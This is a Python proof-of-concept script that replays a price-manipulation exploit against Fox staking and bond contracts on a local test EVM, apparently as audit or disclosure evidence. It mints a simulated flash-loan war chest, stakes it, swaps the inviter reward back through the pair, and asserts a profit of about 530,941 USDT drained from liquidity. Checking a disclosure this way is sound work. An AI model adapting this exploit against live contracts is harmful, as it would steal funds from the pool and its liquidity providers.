#!/usr/bin/env python3
"""Exact deployed-source local EVM replay; external Pancake/flash liquidity are tagged models."""
import argparse, json
from decimal import Decimal, getcontext
from pathlib import Path
from web3 import Web3
from eth_tester import EthereumTester
from web3.providers.eth_tester import EthereumTesterProvider

getcontext().prec = 80
ROOT = Path(__file__).resolve().parents[1]
ARTIFACTS = json.loads((ROOT / 'evidence/artifacts.json').read_text())
E18 = 10**18
USDT_RESERVE = 2786697198864505157273333
FOX_RESERVE = 496041716814196640205248
MAX = 2**256 - 1

class Local:
    def __init__(self, stake_days=540, seed=0):
        self.w3 = Web3(EthereumTesterProvider(EthereumTester()))
        self.deployer, self.attacker, self.distributor = self.w3.eth.accounts[:3]
        self.receipts = []
        self.stake_days = stake_days
        self.seed = seed

    def tx(self, fn, sender=None):
        h = fn.transact({'from': sender or self.deployer, 'gas': 30_000_000, 'gasPrice': 1_000_000_000})
        r = self.w3.eth.wait_for_transaction_receipt(h)
        assert r.status == 1, f'transaction reverted: {h.hex()}'
        self.receipts.append(r)
        return r

    def deploy(self, name, *args, sender=None):
        a = ARTIFACTS[name]
        c = self.w3.eth.contract(abi=a['abi'], bytecode=a['bytecode'])
        r = self.tx(c.constructor(*args), sender)
        return self.w3.eth.contract(address=r.contractAddress, abi=a['abi'])

    def proxy(self, implementation, init_fn):
        data = init_fn._encode_transaction_data()
        p = self.deploy('ERC1967Proxy', implementation.address, data)
        return self.w3.eth.contract(address=p.address, abi=ARTIFACTS['FoxLpBondsPool']['abi'] if 'stake' in str(implementation.abi) else implementation.abi)

    def setup(self):
        self.usdt = self.deploy('MockUSDT')
        self.fox = self.deploy('Fox', 'Fox', 'FOX', self.distributor, self.deployer, 1_000_000)
        self.sfox = self.deploy('StakedFox', 'Staked Fox', 'sFOX', 0)
        self.rfox = self.deploy('RewardFox', 'Reward Fox', 'rFOX', 0)
        self.factory = self.deploy('MiniFactory')
        self.router = self.deploy('MiniRouter', self.factory.address)
        self.tx(self.factory.functions.createPair(self.usdt.address, self.fox.address))
        pair_address = self.factory.functions.getPair(self.usdt.address, self.fox.address).call()
        self.pair = self.w3.eth.contract(address=pair_address, abi=ARTIFACTS['MiniPair']['abi'])
        self.tx(self.usdt.functions.mint(pair_address, USDT_RESERVE * (10000 + self.seed) // 10000))
        self.tx(self.fox.functions.transfer(pair_address, FOX_RESERVE * (10000 + 2*self.seed) // 10000))
        self.tx(self.pair.functions.mint(self.deployer))
        self.log = self.deploy('Log', 'fox')
        self.reward_ratio = self.deploy('RewardRatioLog', 'reward', 0)
        self.discount_ratio = self.deploy('RewardRatioLog', 'discount', 9795)
        referral_impl = self.deploy('Referral')
        referral_data = referral_impl.functions.initialize(self.deployer, self.deployer, self.log.address, self.attacker)._encode_transaction_data()
        referral_proxy = self.deploy('ERC1967Proxy', referral_impl.address, referral_data)
        self.referral = self.w3.eth.contract(address=referral_proxy.address, abi=ARTIFACTS['Referral']['abi'])
        treasury_impl = self.deploy('Treasury')
        treasury_data = treasury_impl.functions.initialize(
            self.deployer, self.deployer, self.usdt.address, self.fox.address,
            self.sfox.address, self.rfox.address, self.rfox.address, pair_address
        )._encode_transaction_data()
        treasury_proxy = self.deploy('ERC1967Proxy', treasury_impl.address, treasury_data)
        self.treasury = self.w3.eth.contract(address=treasury_proxy.address, abi=ARTIFACTS['Treasury']['abi'])
        pool_impl = self.deploy('FoxLpBondsPool')
        pool_data = pool_impl.functions.initialize(
            self.deployer, self.stake_days, treasury_proxy.address, self.log.address,
            referral_proxy.address, self.reward_ratio.address, self.discount_ratio.address,
            self.usdt.address, self.fox.address, self.sfox.address, self.router.address,
            pair_address, 0, 0, 299, 299, self.deployer
        )._encode_transaction_data()
        pool_proxy = self.deploy('ERC1967Proxy', pool_impl.address, pool_data)
        self.pool = self.w3.eth.contract(address=pool_proxy.address, abi=ARTIFACTS['FoxLpBondsPool']['abi'])
        self.tx(self.log.functions.setOperator(pool_proxy.address, True))
        self.tx(self.log.functions.setOperator(referral_proxy.address, True))
        self.tx(self.referral.functions.setReferral(self.attacker, self.attacker))
        self.tx(self.treasury.functions.setFoxDistributor(self.distributor))
        self.tx(self.treasury.functions.setStakingPool(pool_proxy.address))
        self.tx(self.fox.functions.setTreasury(treasury_proxy.address))
        self.tx(self.sfox.functions.setTreasury(treasury_proxy.address))
        self.tx(self.rfox.functions.setTreasury(treasury_proxy.address))
        self.tx(self.fox.functions.setTargetPool(pair_address))
        self.tx(self.fox.functions.setTransferState(True))
        self.tx(self.fox.functions.addWhitelist(pool_proxy.address))

    def run(self, war_chest):
        self.setup()
        self.tx(self.usdt.functions.mint(self.attacker, war_chest))  # LOCAL_STATE_OVERRIDE: flash-liquidity surrogate
        self.tx(self.usdt.functions.approve(self.pool.address, MAX), self.attacker)
        quote_before, raw_quote = self.pool.functions.getSwapPrice(0).call()
        before = self.usdt.functions.balanceOf(self.attacker).call()
        pair_usdt_before = self.usdt.functions.balanceOf(self.pair.address).call()
        pair_fox_before = self.fox.functions.balanceOf(self.pair.address).call()
        stake_id = self.log.functions.getBlockIdListCount().call()
        self.tx(self.pool.functions.stake(war_chest, MAX), self.attacker)
        stake_info = self.pool.functions.stakeInfoMap(stake_id).call()
        inviter_fox = self.fox.functions.balanceOf(self.attacker).call()
        reserves_after_stake = self.pair.functions.getReserves().call()
        quote_after, _ = self.pool.functions.getSwapPrice(0).call()
        if inviter_fox:
            self.tx(self.fox.functions.approve(self.router.address, inviter_fox), self.attacker)
            self.tx(self.router.functions.swapExactTokensForTokensSupportingFeeOnTransferTokens(inviter_fox, 0, [self.fox.address, self.usdt.address], self.attacker, 10**10), self.attacker)
        after = self.usdt.functions.balanceOf(self.attacker).call()
        pair_usdt_after = self.usdt.functions.balanceOf(self.pair.address).call()
        pair_fox_after = self.fox.functions.balanceOf(self.pair.address).call()
        result = {
            'mode': 'LOCAL_EXACT_SOURCE_PANCAKE_AND_FLASH_LIQUIDITY_MODEL',
            'compiler': '0.8.28+commit.7893614a; optimizer 200; viaIR true; cancun',
            'war_chest_usdt_raw': str(war_chest),
            'stake_days': self.stake_days,
            'seed': self.seed,
            'raw_spot_usdt_per_fox': str(raw_quote),
            'discounted_pretrade_quote': str(quote_before),
            'posttrade_quote': str(quote_after),
            'stake_amount_fox_raw': str(stake_info[5]),
            'inviter_fox_raw': str(inviter_fox),
            'attacker_usdt_before_raw': str(before),
            'attacker_usdt_after_raw': str(after),
            'attacker_net_usdt_raw': str(after - before),
            'attacker_fox_after_raw': str(self.fox.functions.balanceOf(self.attacker).call()),
            'pair_usdt_delta_raw': str(pair_usdt_after - pair_usdt_before),
            'pair_fox_delta_raw': str(pair_fox_after - pair_fox_before),
            'pair_reserves_after_stake': [str(x) for x in reserves_after_stake],
            'staked_fox_pool_raw': str(self.sfox.functions.balanceOf(self.pool.address).call()),
            'treasury_retained_fox_raw': str(self.fox.functions.balanceOf(self.treasury.address).call()),
            'reward_fox_distributor_raw': str(self.rfox.functions.balanceOf(self.distributor).call()),
            'dead_lp_raw': str(self.pair.functions.balanceOf('0x000000000000000000000000000000000000dEaD').call()),
            'gas_used_total_including_setup': sum(r.gasUsed for r in self.receipts),
            'gas_price_wei': 1_000_000_000,
            'gas_cost_wei_total_including_setup': sum(r.gasUsed * r.effectiveGasPrice for r in self.receipts),
            'flash_loan_fee_usdt': 0,
            'notes': 'Owner referral binding and minted war chest are tagged local setup surrogates. Real deployed Solidity bodies execute through ERC1967 proxies. Pair is a faithful 0.25%-fee model without feeTo; LP mint amount can differ from mainnet while price/P&L does not. Discount endpoints are fixed at 299 bps solely to match the registry pinned quote; live endpoint storage is not claimed. USDT P&L is before native gas; gas is printed separately in wei and flash-loan fees are zero in this model.'
        }
        for key in ['war_chest_usdt_raw', 'stake_amount_fox_raw', 'inviter_fox_raw', 'attacker_usdt_after_raw', 'attacker_net_usdt_raw', 'pair_usdt_delta_raw']:
            result[key.replace('_raw', '_display')] = format(Decimal(result[key]) / E18, 'f')
        return result

def main():
    p = argparse.ArgumentParser()
    p.add_argument('--case', choices=['canonical', 'small', 'no-inviter', 'evm-seeds'], default='canonical')
    p.add_argument('--output')
    args = p.parse_args()
    if args.case == 'canonical':
        result = Local(540).run(450_000_000 * E18)
        assert result['discounted_pretrade_quote'] == '5436258687853353081', result
        assert result['stake_amount_fox_raw'] == '82777517744964801045863495', result
        assert result['inviter_fox_raw'] == '2483325532348944031375904', result
        assert result['attacker_usdt_after_raw'] == '450530941023056701789655683', result
        assert result['attacker_net_usdt_raw'] == '530941023056701789655683', result
        assert result['pair_usdt_delta_raw'] == '-530941023056701789655683', result
        assert int(result['posttrade_quote']) > int(result['discounted_pretrade_quote'])
    elif args.case == 'small':
        result = Local(540).run(1_000 * E18)
        assert int(result['attacker_net_usdt_raw']) < 0, result
        assert int(result['inviter_fox_raw']) > 0, result
    elif args.case == 'no-inviter':
        result = Local(179).run(450_000_000 * E18)
        assert result['inviter_fox_raw'] == '0', result
        assert int(result['attacker_net_usdt_raw']) < 0, result
    else:
        import csv
        with (ROOT/'evidence/campaign.csv').open() as f:
            model_rows = {r['row_id']: r for r in csv.DictReader(f)}
        results = []
        for seed in range(8):
            r = Local(540, seed).run(450_000_000 * E18)
            model = model_rows[f'S0-C-A-seed{seed}']
            assert r['attacker_net_usdt_raw'] == model['profit_usdt_raw'], (r, model)
            assert r['stake_amount_fox_raw'] == model['stake_amount_fox_raw'], (r, model)
            assert r['inviter_fox_raw'] == model['inviter_fox_raw'], (r, model)
            results.append(r)
        result = {'mode': 'EIGHT_SEED_EXACT_SOURCE_EVM_VS_INTEGER_MODEL', 'passed': 8, 'failed': 0, 'results': results}
    text = json.dumps(result, indent=2)
    print(text)
    output = Path(args.output) if args.output else ROOT / 'evidence' / f'{args.case}-replay.json'
    output.write_text(text + '\n')

if __name__ == '__main__':
    main()
